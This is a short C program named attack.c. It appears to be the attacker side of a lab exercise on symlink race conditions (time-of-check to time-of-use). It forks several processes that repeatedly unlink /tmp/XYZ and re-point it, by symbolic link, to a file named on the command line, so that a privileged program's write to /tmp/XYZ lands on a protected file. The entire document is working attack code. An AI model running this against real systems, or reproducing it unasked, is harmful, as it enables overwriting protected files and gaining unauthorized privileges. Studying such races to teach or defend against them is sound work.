    /*  attack.c  */

    #include <stdio.h>
    #include <unistd.h>
    #include <unistd.h>

    int main(int argc, char *argv[])
    {
	char * fn = "/tmp/XYZ";
	int x = 0;
	for (x = 0; x < 3; x ++){
		if(fork() == 0){
			unlink(fn);
			symlink(argv[1], fn);
		}
	}
    }
